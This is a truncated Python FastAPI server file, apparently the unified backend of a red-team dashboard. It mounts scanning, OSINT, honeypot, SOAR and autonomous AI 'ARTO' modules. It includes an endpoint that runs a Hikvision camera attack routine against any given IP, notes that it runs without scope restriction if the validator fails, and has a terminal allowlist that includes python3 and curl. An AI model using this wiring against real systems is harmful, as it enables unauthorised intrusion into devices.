#!/usr/bin/env python3
"""
RED-TEAM-TAURI · Dashboard Server Unificado (v3.0)
====================================================
Backend ÚNICO en :8001 · FastAPI · Sirve dist/ estático.

Absorbe TODOS los endpoints del backend anterior (http.server)
más los nuevos del v2 FastAPI. Sin mocks. Sin dummy data.

Endpoints:
  ESCANEO:     /api/scan/topology|cameras|routers|iot|wifi|antenna|radio
  OSINT:       /api/osint/shodan, /api/exploits/list
  HONEYPOT:    /api/honeypot/start|stop|status|toggle|rotate
  CANARY:      /api/canary/generate, /canary/callback, /api/canary/svg/*
  SERVICIOS:   /api/services (GET), /start|stop|restart, /start-all|stop-all, /logs
  RECURSOS:    /api/resources
  ESCANEOS:    /api/scan (POST), /api/scan/status, /api/latest, /api/history
  CONFIG:      /api/config (GET), /api/config/read, /api/config/write
  SOAR:        /api/soar/dags (GET|POST), /api/soar/dry-run
  TIP:         /api/tip/iocs (GET|POST|DELETE), /api/tip/update, /api/tip/import-stix
  RASP:        /api/rasp/devices (GET|POST|DELETE)
  TERMINAL:    /api/terminal (POST)
  SETTINGS:    /api/settings (GET|POST)
  GEO:         /api/geo?ip=X
  INTEL:       /api/intel?ip=X
  NETWORK:     /api/network/cameras|radio|routers|stats
  IoT:         /api/iot, /api/iot/video-urls, /api/iot/snapshot, /api/iot/stream
  WEBSOCKET:   /ws
  ARTO:        /api/arto/* (AI autónomo — start/stop/operation/predict/defend)
  HEALTH:      /api/health
  FRONTEND:    SPA fallback → dist/index.html
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import shlex
import socket
import ipaddress
import ssl
import subprocess
import sys
import threading
import time
import uuid
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Query, Depends, HTTPException, Security, Body
from fastapi.security import APIKeyHeader
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, FileResponse, HTMLResponse, Response, PlainTextResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
import httpx

# ── Paths ────────────────────────────────────────────────────────────────────
SCRIPT_DIR = Path(__file__).resolve().parent
BASE       = SCRIPT_DIR.parent                         # redteam/
ROOT       = BASE                                       # alias
DIST       = (BASE.parent / "tauri-frontend" / "dist").resolve()

REPORTS   = ROOT / "reports"
EVIDENCE  = ROOT / "evidence"
LOGS_DIR  = ROOT / "logs"
DATA_DIR  = ROOT / "data"
CANARY_SVG_DIR = ROOT / "evidence" / "canary-svg-files"
CANARY_ALERTS = []  # Alertas recibidas, persistidas en runtime

for d in (REPORTS, EVIDENCE, LOGS_DIR, DATA_DIR, CANARY_SVG_DIR):
    d.mkdir(parents=True, exist_ok=True)

# ── JSON data files ─────────────────────────────────────────────────────────
IOC_FILE      = DATA_DIR / "iocs.json"
DEVICES_FILE  = DATA_DIR / "rasp_devices.json"
HONEYPOT_FILE = DATA_DIR / "honeypot.json"
SOAR_FILE     = DATA_DIR / "soar_dags.json"
SETTINGS_FILE = DATA_DIR / "settings.json"

def _load_json(path: Path, default):
    if path.exists():
        try: return json.loads(path.read_text())
        except: pass
    return default

def _save_json(path: Path, data):
    path.write_text(json.dumps(data, indent=2, default=str))

def _init_data():
    """Inicializa archivos VACÍOS. Cero datos falsos."""
    if not IOC_FILE.exists(): _save_json(IOC_FILE, [])
    if not DEVICES_FILE.exists(): _save_json(DEVICES_FILE, [])
    if not HONEYPOT_FILE.exists():
        _save_json(HONEYPOT_FILE, {"active": False, "tokens_deployed": 0,
            "triggers_today": 0, "triggers_total": 0,
            "last_trigger": None, "token_rotated_at": None})
    if not SOAR_FILE.exists(): _save_json(SOAR_FILE, [])
    if not SETTINGS_FILE.exists():
        _save_json(SETTINGS_FILE, {"api_url": "", "interval": 15,
            "scan_on_startup": False, "notify_slack": False, "slack_webhook": ""})

_init_data()

# ── Geo/Intel module ─────────────────────────────────────────────────────────
sys.path.insert(0, str(ROOT))
try:
    from geo_intel import lookup as _geo_lookup, assess as _intel_assess
    _GEO_INTEL_OK = True
except Exception as _geo_err:
    _GEO_INTEL_OK = False
    print(f"[WARN] geo_intel import falló: {_geo_err}", flush=True)

# ── psutil (opcional) ────────────────────────────────────────────────────────
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False


# ── Enhanced Recon Module (ONVIF, SSDP, SNMP, NetBIOS, mDNS) ────────────────
# Resolver path absoluto: buscar backend/modules/enhanced_recon.py en múltiples ubicaciones
_ENHANCED_RECON_OK = False
for _bp in [BASE.parent / "backend", BASE / "backend", SCRIPT_DIR.parent.parent / "backend", Path.cwd() / "backend"]:
    if (_bp / "modules" / "enhanced_recon.py").exists():
        sys.path.insert(0, str(_bp))
        try:
            from modules.enhanced_recon import router as enhanced_recon_router
            _ENHANCED_RECON_OK = True
            print(f"[ENHANCED-RECON] Cargado desde {_bp} — ONVIF + SSDP + SNMP + NetBIOS + mDNS")
            break
        except Exception as _er_err:
            sys.path.pop(0)
            print(f"[WARN] enhanced_recon import falló desde {_bp}: {_er_err}", flush=True)
if not _ENHANCED_RECON_OK:
    print("[WARN] enhanced_recon no encontrado — /api/enhanced/* no disponible", flush=True)

# ── OSINT Advanced v4.0 (Google, Shodan, VirusTotal, Censys, Social) ─────────
try:
    from modules.osint_advanced import osint_router
    _OSINT_ADVANCED_OK = True
    print("[OSINT-ADVANCED] Módulo v4.0 cargado: WHOIS + DNS + Shodan + VirusTotal + Google + Social")
except Exception as _oa_err:
    _OSINT_ADVANCED_OK = False
    print(f"[WARN] osint_advanced import falló: {_oa_err}", flush=True)

# ── Interceptor Advanced v4.0 (XXE, LFI/RFI, LDAP, NoSQL, SQLi, XSS, SSRF) ──
try:
    from tlsproxy.interceptor_advanced import interceptor_router
    _INTERCEPTOR_ADVANCED_OK = True
    print("[INTERCEPTOR-ADVANCED] Módulo v4.0 cargado: MITM + Injection Detection + SIEM")
except Exception as _ia_err:
    _INTERCEPTOR_ADVANCED_OK = False
    print(f"[WARN] interceptor_advanced import falló: {_ia_err}", flush=True)

API_KEY = os.environ.get("REDTEAM_API_KEY", "").strip()

# ── Motor de Cierre (leads/checkout/metrics) — antes corria como un 2do
# proceso FastAPI en el MISMO puerto 8001 que este backend, lo que hacia
# que solo uno de los dos pudiera estar vivo a la vez. Se monta aqui como
# sub-app para que TODO viva en un solo proceso/puerto de verdad.
    # Alinear el API key: dashboard_server.py emite tokens via REDTEAM_API_KEY
    # su propio default distinto ("dev-key-cambiar-en-produccion") -> con
    # esto ambos aceptan el MISMO token emitido por /api/auth/login.

# ── App ──────────────────────────────────────────────────────────────────────
app = FastAPI(
    title="Red-Team Tauri · Unified Dashboard Backend",
    version="4.0-unified",
    description="Backend único: escaneo + servicios + SOAR + TIP + RASP + terminal + canary + honeypot + dist/",
)

# ── Include Enhanced Recon router ──────────────────────────────────────────
if _ENHANCED_RECON_OK:
    app.include_router(enhanced_recon_router)
    print("[ENHANCED-RECON] Router montado en /api/enhanced/*")

# ── Include OSINT Advanced v4.0 router ─────────────────────────────────────
if _OSINT_ADVANCED_OK:
    app.include_router(osint_router)
    print("[OSINT-ADVANCED] Router montado en /api/osint/* (v4.0: Google, Shodan, VT, Social)")

# ── Include Interceptor Advanced v4.0 router ──────────────────────────────
if _INTERCEPTOR_ADVANCED_OK:
    app.include_router(interceptor_router)
    print("[INTERCEPTOR-ADVANCED] Router montado en /api/interceptor/* (v4.0: MITM + SIEM)")

# ── OSINT Bridge v2 (full-scan, quick-scan, search unificado) ──────────────
try:
    from modules.osint_bridge import router as osint_bridge_router
    app.include_router(osint_bridge_router)
    print("[OSINT-BRIDGE] Router v2 montado en /api/osint/v2/*")
except Exception as _ob_err:
    print(f"[WARN] osint_bridge v2 import fallo: {_ob_err}", flush=True)

# ── Interceptor Bridge v2 (control, flows, alerts, stats, analyze) ──────────
try:
    from tlsproxy.interceptor_bridge import router as interceptor_bridge_router
    app.include_router(interceptor_bridge_router)
    print("[INTERCEPTOR-BRIDGE] Router v2 montado en /api/interceptor/v2/*")
except Exception as _ib_err:
    print(f"[WARN] interceptor_bridge v2 import fallo: {_ib_err}", flush=True)

# ── ARTO — Automated Red Team Operations (AI autónomo) ────────────────────
_ARTO_OK = False
try:
    sys.path.insert(0, str(BASE.parent / "arto"))
    sys.path.insert(0, str(BASE.parent))
    from arto.api.arto_router import router as arto_router
    app.include_router(arto_router)
    _ARTO_OK = True
    print("[ARTO] Router montado en /api/arto/* (AI autónomo de operaciones)")

    # Auto-inicializar ARTO al arrancar el servidor
    @app.on_event("startup")
    async def _arto_auto_start():
        global _ARTO_OK
        try:
            from arto import arto as _arto_instance
            await _arto_instance.start()
            print("[ARTO] ✅ Sistema ARTO inicializado y listo para operar")
        except Exception as _e:
            print(f"[ARTO] ⚠ No se pudo inicializar ARTO: {_e}")
            _ARTO_OK = False

    @app.on_event("shutdown")
    async def _arto_auto_stop():
        try:
            from arto import arto as _arto_instance
            if _arto_instance.running:
                await _arto_instance.stop()
                print("[ARTO] Sistema ARTO detenido correctamente")
        except Exception:
            pass

except Exception as _arto_err:
    _ARTO_OK = False
    print(f"[WARN] ARTO import falló: {_arto_err}", flush=True)

# ── SEAL SUPER PACK — Escaneo, ataque, fingerprinting, orquestación ─────────
_SEAL_OK = False
try:
    from seal.api.seal_api_router import router as seal_router
    app.include_router(seal_router)
    _SEAL_OK = True
    print("[SEAL] Router montado en /api/devices, /api/scan, /api/status (SEAL SUPER PACK)")

    @app.on_event("startup")
    async def _seal_auto_start():
        global _SEAL_OK
        try:
            from seal.orchestrator.seal_orchestrator import get_orchestrator
            _orch = get_orchestrator()
            print("[SEAL] ✅ Orquestador SEAL inicializado")
        except Exception as _e:
            print(f"[SEAL] ⚠ No se pudo inicializar orquestador: {_e}")

    @app.on_event("shutdown")
    async def _seal_auto_stop():
        try:
            from seal.orchestrator.seal_orchestrator import get_orchestrator
            _orch = get_orchestrator()
            if hasattr(_orch, 'stop'):
                _orch.stop()
                print("[SEAL] Orquestador detenido")
        except Exception:
            pass

except Exception as _seal_err:
    _SEAL_OK = False
    print(f"[WARN] SEAL import falló: {_seal_err}", flush=True)

# ── LEVIATHAN v3.0 — Módulos de Red Team (scanners, exploiters, AI, reporters) ──
_LEVIATHAN_OK = False
try:
    sys.path.insert(0, str(BASE.parent))
    import leviathan_core
    from leviathan_core.api.leviathan_router import router as leviathan_router
    from leviathan_core.api.integration_router import router as leviathan_integration
    app.include_router(leviathan_router)
    app.include_router(leviathan_integration)
    _LEVIATHAN_OK = True

    # Mostrar el banner ASCII de LEVIATHAN (existia en leviathan_core/banner.py
    # pero nunca se llamaba desde ningun lado — nunca se veia al arrancar)
    try:
        leviathan_core.show_banner()
    except Exception:
        pass

    print("[LEVIATHAN] Router montado: /api/leviathan/* + /api/v1/* (unified)", flush=True)

    # Auto-inicializar LEVIATHAN al arrancar el servidor (mismo patron que ARTO)
    # Pre-carga scanners/exploiters/analyzers/reporters en memoria para que el
    # primer request no pague el costo de import + registro de modulos.
    @app.on_event("startup")
    async def _leviathan_auto_start():
        global _LEVIATHAN_OK
        try:
            from leviathan_core.api.leviathan_router import _load_modules as _lev_load
            _lev_load()
            print("[LEVIATHAN] ✅ Módulos precargados y listos para operar", flush=True)
        except Exception as _e:
            print(f"[LEVIATHAN] ⚠ No se pudieron precargar módulos: {_e}", flush=True)
            # No desactivamos _LEVIATHAN_OK: el router sigue funcionando,
            # simplemente cargará los módulos de forma perezosa en el primer request.

except ImportError as _lev_err:
    import traceback
    print(f"[WARN] LEVIATHAN import falló (ImportError): {_lev_err}", flush=True)
    traceback.print_exc()
    _LEVIATHAN_OK = False
except Exception as _lev_err:
    import traceback
    print(f"[WARN] LEVIATHAN import falló (Exception): {_lev_err}", flush=True)
    traceback.print_exc()
    _LEVIATHAN_OK = False

# ── Endpoints de integración ARTO + SEAL ──────────────────────────────────
@app.get("/api/integrated/health")
async def integrated_health():
    """Estado de todos los sistemas integrados (ARTO + SEAL + módulos)"""
    return {
        "status": "healthy",
        "arto": _ARTO_OK,
        "seal": _SEAL_OK,
        "leviathan": _LEVIATHAN_OK,
        "timestamp": str(datetime.now())
    }

@app.get("/api/integrated/scan")
async def integrated_scan(network: str = "192.168.1.0/24"):
    """Escaneo integrado: SEAL detecta dispositivos, ARTO analiza amenazas"""
    try:
        from seal.scanners.network_sweep_ultimate import discover_active_ips, scan_target
        active_ips = await discover_active_ips(network)
        results = []
        for ip in active_ips[:20]:
            try:
                target_data = await scan_target(ip)
                if target_data.get('services'):
                    results.append(target_data)
            except Exception:
                pass
        return {"success": True, "network": network, "scanned": len(active_ips), "targets": results}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/integrated/attack/{ip}")
async def integrated_attack(ip: str):
    """Ataque integrado: SEAL explota, ARTO decide la acción"""
    try:
        from seal.attackers.hikvision_killer import scan_and_attack
        result = await scan_and_attack(ip)
        return {"success": True, "result": result}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ── API Key (obligatoria) ────────────────────────────────────────────────────
API_KEY_HEADER = APIKeyHeader(name="X-API-Key", auto_error=False)

# Endpoints PÚBLICOS (no requieren API key):
#   /api/health, /health, /healthz  → health checks
#   /canary/callback               → intruso phone-home (debe ser accesible)
PUBLIC_PATHS = {"/api/health", "/health", "/healthz", "/canary/callback", "/api/auth/login", "/api/auth/biometric", "/api/auth/password", "/api/auth/webauthn/status", "/api/auth/webauthn/register/begin", "/api/auth/webauthn/register/finish", "/api/auth/webauthn/auth/begin", "/api/auth/webauthn/auth/finish", "/favicon.ico", "/robots.txt", "/manifest.json"}

# ── CORS lockdown ───────────────────────────────────────────────────────────
ALLOWED_ORIGINS = [o.strip() for o in os.environ.get("ALLOWED_ORIGINS", "http://localhost:5173,http://127.0.0.1:5173").split(",") if o.strip()]

# == CORSET + TRIAGE + OSINT INTEGRATION ====================================
# Auto-detect environment and load modules
import sys as _sys
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if _SCRIPT_DIR not in _sys.path:
    _sys.path.insert(0, _SCRIPT_DIR)

# -- Corset Scope Validator (auto-detect Termux vs Replit) --
_corset = None
try:
    if os.environ.get("REPL_ID") or os.environ.get("REPL_SLUG"):
        from corset_replit import CorsetReplit
        _corset = CorsetReplit()
        print(f"[CORSET] Replit mode activado. Scope: {_corset.status()}")
    else:
        from corset_termux import CorsetTermux
        _corset = CorsetTermux()
        print(f"[CORSET] Termux mode activado. Scope: {_corset.status()}")
except Exception as e:
    print(f"[CORSET] WARNING: No se pudo activar: {e}")
    print("[CORSET] El sistema operara SIN restriccion de scope.")

# -- Triage Module --
_triage_report = None
try:
    from triage_module import get_triage_report
    _triage_report = get_triage_report
except Exception as e:
    print(f"[TRIAGE] No cargado: {e}")

# -- OSINT Module --
_osint_extract = None
try:
    from osint_module import extract_from_text
    _osint_extract = extract_from_text
except Exception as e:
    print(f"[OSINT] No cargado: {e}")
# == END CORSET + TRIAGE + OSINT INTEGRATION ================================"

app.add_middleware(CORSMiddleware, allow_origins=ALLOWED_ORIGINS, allow_credentials=True,
                   allow_methods=["GET", "POST", "DELETE", "PATCH", "OPTIONS"], 
                   allow_headers=["X-API-Key", "Content-Type", "Authorization"],
                   expose_headers=["*"])

# ── Rate limiting (simple, en memoria) ───────────────────────────────────────
RATE_LIMIT = int(os.environ.get("RATE_LIMIT", "300"))  # requests por minuto por IP
_rate_store: dict[str, list[float]] = {}

def _rate_check(client_ip: str) -> bool:
    now = time.time()
    bucket = _rate_store.get(client_ip, [])
    bucket = [t for t in bucket if now - t < 60]
    if len(bucket) >= RATE_LIMIT:
        return False
    bucket.append(now)
    _rate_store[client_ip] = bucket
    return True

# ── Validación de IP ─────────────────────────────────────────────────────────
def _valid_ip(ip: str) -> bool:
    """Validación de IP usando ipaddress.ip_address() de la stdlib.
    Robusto contra bypass por all() sobre iterable vacío y caracteres de inyección."""
    if not ip or len(ip) > 45:
        return False
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# ── Path traversal protection ────────────────────────────────────────────────
def _safe_path(path: str) -> bool:
    if not path:
        return False
    if ".." in path or path.startswith("/"):
        return False
    resolved = (ROOT / path).resolve()
    return str(resolved).startswith(str(ROOT.resolve()))

# ── Middleware de autenticación ─────────────────────────────────────────────
@app.middleware("http")
async def security_middleware(request: Request, call_next):
    path = request.url.path

    # Preflight CORS (OPTIONS) nunca lleva Authorization -- es requisito del
    # spec de CORS que el navegador lo envie sin credenciales. Si el
    # middleware de auth lo bloquea con 401, el CORSMiddleware nunca llega
    # a responder el preflight y el navegador aborta la request real con
    # un error de red (no HTTP status legible por el frontend). Dejar pasar
    # OPTIONS sin autenticar -- es inofensivo, no ejecuta logica de negocio.
    if request.method == "OPTIONS":
        return await call_next(request)

    # Rate limiting en TODAS las rutas
    client_ip = request.client.host if request.client else "unknown"
    if not _rate_check(client_ip):
        return JSONResponse({"error": "Rate limit exceeded"}, status_code=429)

    # Health checks y canary callback son públicos
    if path in PUBLIC_PATHS or path == "/" or path.startswith("/assets/") or path.startswith("/vite/") or path.endswith(".ico") or path.endswith(".png") or path.endswith(".svg") or path.endswith(".webmanifest"):
        return await call_next(request)

    # Todo lo demás requiere autenticación. El frontend envía el token emitido
    # por /api/auth/login como "Authorization: Bearer <token>". También se
    # acepta X-API-Key para compatibilidad con scripts.
    if not API_KEY:
        # Si no hay API key configurada, permitir solo desde localhost
        if client_ip not in ("127.0.0.1", "::1", "localhost"):
            return JSONResponse({"error": "Unauthorized — API key required"}, status_code=401)
    else:
        # Intentar X-API-Key primero (compatibilidad scripts)
        key = request.headers.get("X-API-Key", "")
        # Luego intentar Authorization: Bearer <token> (lo que usa el frontend)
        if not key:
            auth_header = request.headers.get("Authorization", "")
            if auth_header.startswith("Bearer "):
                key = auth_header[7:]
        # Endpoints SSE (EventSource del navegador) NO PUEDEN mandar headers
        # custom -- es una limitacion del propio API EventSource, no un bug
        # de implementacion. El unico canal disponible es la query string.
        # Restringido SOLO a paths de streaming para no exponer el token via
        # query param (logs/referrer) en el resto de la API.
        if not key and path.endswith("/stream"):
            key = request.query_params.get("token", "")
        if key != API_KEY:
            return JSONResponse({"error": "Unauthorized"}, status_code=401)

    # Timeout: los escaneos de red (nmap, ONVIF) pueden tardar hasta 60s en
    # Termux. El resto de endpoints se limita a 25s para evitar cuelgues.
    _scan_paths = ("/api/scan/", "/api/enhanced/discover", "/api/network/cameras",
                   "/api/iot/scan", "/api/capture/")
    _timeout = 150.0 if any(path.startswith(p) for p in _scan_paths for path in [request.url.path]) else 25.0
    try:
        return await asyncio.wait_for(call_next(request), timeout=_timeout)
    except asyncio.TimeoutError:
        return JSONResponse(
            {"error": "Request timeout", "detail": f"La operación tardó más de {_timeout:.0f}s. Intenta con un rango más pequeño."},
            status_code=504
        )

# ── WebSocket hub ────────────────────────────────────────────────────────────
ws_clients: set[WebSocket] = set()

@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    await ws.accept()
    ws_clients.add(ws)
    try:
        await ws.send_json({"type": "hello", "ts": int(time.time()), "msg": "unified-backend-ready"})
        while True:
            data = await ws.receive_text()
            try:
                msg = json.loads(data)
                if msg.get("type") == "ping":
                    await ws.send_json({"type": "pong", "ts": int(time.time())})
            except Exception:
                pass
    except WebSocketDisconnect:
        pass
    finally:
        ws_clients.discard(ws)

async def broadcast(payload: dict):
    dead = []
    for c in ws_clients:
        try: await c.send_json(payload)
        except: dead.append(c)
    for c in dead: ws_clients.discard(c)

# ═════════════════════════════════════════════════════════════════════════════
#  UTILIDADES DE RED
# ═════════════════════════════════════════════════════════════════════════════

async def tcp_check(host: str, port: int, timeout: float = 1.5) -> Optional[str]:
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout)
        banner = ""
        try:
            data = await asyncio.wait_for(reader.read(256), timeout=0.8)
            banner = data.decode(errors="ignore").strip()[:120]
        except: pass
        writer.close()
        try: await writer.wait_closed()
        except: pass
        return banner
    except: return None

def _detect_active_iface() -> Optional[str]:
    """Detecta la interfaz de red REALMENTE activa (la que tiene la ruta default),
    en vez de asumir 'wlan0' que en muchos Android/Termux no existe o no es la activa."""
    try:
        out = subprocess.check_output(["ip", "route", "get", "8.8.8.8"],
                                      stderr=subprocess.DEVNULL).decode()
        m = re.search(r"dev\s+(\S+)", out)
        if m: return m.group(1)
    except: pass
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"],
                                      stderr=subprocess.DEVNULL).decode()
        m = re.search(r"dev\s+(\S+)", out)
        if m: return m.group(1)
    except: pass
    return None

def subnet_from_iface(iface: str = None) -> str:
    """Devuelve el CIDR real de la red local. Ya NO asume wlan0: si no se
    especifica interfaz, detecta la interfaz activa. Si todo falla, usa la
    IP local real (truco del socket UDP) en vez de un 192.168.1.0/24 falso."""
    target_iface = iface or _detect_active_iface()
    if target_iface:
        try:
            out = subprocess.check_output(["ip", "route", "show", "dev", target_iface],
                                          stderr=subprocess.DEVNULL).decode()
            for line in out.splitlines():
                parts = line.split()
                if parts and "/" in parts[0]: return parts[0]
        except: pass
    # Fallback: usar la IP local real detectada (nunca un subnet inventado)
    net = _detect_local_network()
    return net["cidr"]

def _detect_local_network() -> dict:
    # 1) psutil: enumerar interfaces reales y elegir la primera IP privada
    #    no-loopback. Mas confiable que el truco del socket UDP en Android/
    #    Termux -- el sandboxing de la app puede hacer que connect() no
    #    refleje la interfaz Wi-Fi real y caiga silenciosamente a loopback,
    #    lo que rompia la topologia mostrando "127.0.0.0/24" (red inutil).
    if HAS_PSUTIL:
        try:
            for _iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        ip = addr.address
                        if ip.startswith("127.") or ip.startswith("169.254."):
                            continue
                        try:
                            if ipaddress.ip_address(ip).is_private:
                                parts = ip.split(".")
                                return {"ip": ip, "mask": addr.netmask or "255.255.255.0",
                                        "cidr": f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"}
                        except ValueError:
                            continue
        except Exception:
            pass
    # 2) Fallback: truco del socket UDP (no exige permisos especiales).
    #    Se descarta explicitamente si devuelve loopback -- eso nunca es
    #    la red real y antes se aceptaba tal cual.
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        if not local_ip.startswith("127."):
            parts = local_ip.split(".")
            return {"ip": local_ip, "mask": "255.255.255.0", "cidr": f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"}
    except Exception:
        pass
    # 3) Ultimo recurso real -- si esto se ve en la UI, revisar permisos de
    #    red de Termux o si hay Wi-Fi activo.
    return {"ip": "127.0.0.1", "mask": "255.255.255.0", "cidr": "127.0.0.0/24"}

def _nmap_or_empty_sync(args: list, timeout: int = 60) -> tuple:
    try:
        out = subprocess.check_output(args, stderr=subprocess.DEVNULL, timeout=timeout).decode(errors="ignore")
        return True, out
    except FileNotFoundError: return False, "nmap no instalado. Ejecuta: pkg install nmap"
    except subprocess.TimeoutExpired: return False, "timeout — nmap tardo mas de lo esperado. Intenta con un rango mas pequeno (ej /28)"
    except Exception as e: return False, str(e)

async def _nmap_or_empty(args: list, timeout: int = 60) -> tuple:
    # CRITICO: subprocess.check_output() es BLOQUEANTE. Si se llama directo
    # desde un endpoint async, congela TODO el event loop mientras corre —
    # el timeout del middleware (asyncio.wait_for) no puede cancelarlo porque
    # nunca cede control (no hay await de por medio), asi que el proceso
    # sigue vivo de fondo bloqueando el resto del backend aunque el cliente
    # ya recibio "Request timeout". Se ejecuta en un thread aparte para que
    # el loop quede libre y el timeout real corte a tiempo.
    return await asyncio.to_thread(_nmap_or_empty_sync, args, timeout)

# ── Terminal allowlist ───────────────────────────────────────────────────────
ALLOWED_CMDS = {"ls","cat","pwd","whoami","date","uptime","ps","top","grep",
    "find","head","tail","wc","echo","python3","curl","dig","nslookup",
    "openssl","netstat","ss","df","free","uname","id","env"}

def _run_terminal(command: str) -> dict:
    # Sanitizar: usar shlex para parsear sin shell
    try:
        parts = shlex.split(command.strip())
    except ValueError:
        return {"stdout": "", "stderr": "invalid command", "code": 1}
    if not parts: return {"stdout": "", "stderr": "empty command", "code": 1}
    base = parts[0].lstrip("/").split("/")[-1]
    if base not in ALLOWED_CMDS:
        return {"stdout": "", "stderr": f"command '{base}' not allowed", "code": 1}
    try:
        result = subprocess.run(parts, shell=False, capture_output=True, text=True, timeout=10, cwd=str(ROOT))
        return {"stdout": result.stdout[:8192], "stderr": result.stderr[:2048], "code": result.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "timeout (10s)", "code": 124}
    except Exception:
        return {"stdout": "", "stderr": "execution error", "code": 1}

# ── Services ──────────────────────────────────────────────────────────────────
SERVICE_DEFS = {
    "dashboard_server": {"description": "REST API Server (this process)", "cmd": None, "log_file": str(LOGS_DIR / "dashboard.log")},
    "arto": {"description": "ARTO AI — operaciones autónomas de red team", "cmd": None, "log_file": str(LOGS_DIR / "dashboard.log"), "in_process_flag": "_ARTO_OK"},
    "leviathan": {"description": "LEVIATHAN v3.0 — scanners, exploiters, AI, reporters", "cmd": None, "log_file": str(LOGS_DIR / "dashboard.log"), "in_process_flag": "_LEVIATHAN_OK"},
    "xdr-correlator": {"description": "XDR Correlator — MITRE ATT&CK correlation engine",
        "cmd": [sys.executable, "-c", f"import sys; sys.path.insert(0,'{ROOT}'); from xdr.correlator import XDREngine; import time; eng=XDREngine(); print('[xdr] ready'); time.sleep(999999)"],
        "log_file": str(LOGS_DIR / "xdr.log")},
    "ndr-engine": {"description": "NDR Engine — network anomaly detection",
        "cmd": [sys.executable, "-c", f"import sys; sys.path.insert(0,'{ROOT}'); from ndr.engine import NDREngine; import time; eng=NDREngine(); print('[ndr] ready'); time.sleep(999999)"],
        "log_file": str(LOGS_DIR / "ndr.log")},
    "rasp-attestation": {"description": "RASP Attestation Server (port 8000)",
        "cmd": [sys.executable, str(ROOT / "rasp" / "attestation_server.py")], "log_file": str(LOGS_DIR / "rasp.log")},
    "soar-engine": {"description": "SOAR Engine — automated response playbooks",
        "cmd": [sys.executable, "-c", f"import sys; sys.path.insert(0,'{ROOT}'); from soar.engine import SOAREngine; import time; eng=SOAREngine(); print('[soar] ready'); time.sleep(999999)"],
        "log_file": str(LOGS_DIR / "soar.log")},
    "ztna-gateway": {"description": "ZTNA Gateway — zero-trust access control",
        "cmd": [sys.executable, str(ROOT / "ztna" / "gateway.py")], "log_file": str(LOGS_DIR / "ztna.log")},
    "deception-mesh": {"description": "Deception Mesh — dynamic honeypot mesh",
        "cmd": [sys.executable, "-c", f"import sys; sys.path.insert(0,'{ROOT}'); from deception.mesh import DeceptionMesh; import time; m=DeceptionMesh(); print('[deception] ready'); time.sleep(999999)"],
        "log_file": str(LOGS_DIR / "deception.log")},
    "fake-api": {"description": "Fake API — deceptive API endpoints",
        "cmd": [sys.executable, str(ROOT / "honeypot" / "fake-api" / "server.py")], "log_file": str(LOGS_DIR / "fake-api.log")},
    "c2-sinkhole": {"description": "C2 Sinkhole — DNS sinkhole for C2 traffic",
        "cmd": [sys.executable, str(ROOT / "honeypot" / "c2-sinkhole" / "sinkhole.py")], "log_file": str(LOGS_DIR / "c2-sinkhole.log")},
    "canary-monitor": {"description": "Canary Monitor — canary token alerting",
        "cmd": [sys.executable, "-c", f"import sys; sys.path.insert(0,'{ROOT}'); from monitor.canary_monitor import CanaryMonitor; import time; m=CanaryMonitor(); print('[canary] ready'); time.sleep(999999)"],
        "log_file": str(LOGS_DIR / "canary.log")},
    "network-ids": {"description": "Network IDS — intrusion detection",
        "cmd": [sys.executable, str(ROOT / "honeypot" / "network-ids" / "ids_rules.py")], "log_file": str(LOGS_DIR / "network-ids.log")},
}

_svc_lock = threading.Lock()
_svc_procs = {}
_svc_start_times = {}
_SERVER_START = time.time()

def _fmt_uptime(since):
    secs = int(time.time() - since)
    h, rem = divmod(secs, 3600); m, s = divmod(rem, 60)
    return f"{h}h {m}m {s}s" if h else f"{m}m {s}s"

def _tail_log(name: str, n: int = 20) -> list:
    log_file = Path(SERVICE_DEFS.get(name, {}).get("log_file", ""))
    if not log_file.exists(): return []
    try:
        lines = log_file.read_text(errors="replace").splitlines()
        return lines[-n:] if lines else []
    except: return []

def _svc_status(name: str) -> dict:
    if name == "dashboard_server":
        return {"name": name, "status": "running", "pid": os.getpid(),
                "uptime": _fmt_uptime(_SERVER_START), "lastLogs": _tail_log(name, 5),
                "description": SERVICE_DEFS[name]["description"]}
    defn0 = SERVICE_DEFS.get(name, {})
    if defn0.get("in_process_flag"):
        # Servicios que viven dentro de este mismo proceso (ARTO, LEVIATHAN):
        # no son subprocess, reportamos su flag de inicialización real.
        is_ok = globals().get(defn0["in_process_flag"], False)
        return {"name": name, "status": "running" if is_ok else "error", "pid": os.getpid() if is_ok else None,
                "uptime": _fmt_uptime(_SERVER_START) if is_ok else None,
                "lastLogs": _tail_log(name, 5), "description": defn0["description"]}
    proc = _svc_procs.get(name)
    if proc is None or proc.poll() is not None:
        return {"name": name, "status": "stopped", "pid": None, "uptime": None,
                "lastLogs": _tail_log(name, 5), "description": SERVICE_DEFS[name]["description"]}
    return {"name": name, "status": "running", "pid": proc.pid,
            "uptime": _fmt_uptime(_svc_start_times.get(name, time.time())),
            "lastLogs": _tail_log(name, 5), "description": SERVICE_DEFS[name]["description"]}

def _start_service(name: str) -> dict:
    defn = SERVICE_DEFS.get(name)
    if not defn: return {"ok": False, "message": f"Unknown: {name}"}
    if defn.get("in_process_flag"):
        is_ok = globals().get(defn["in_process_flag"], False)
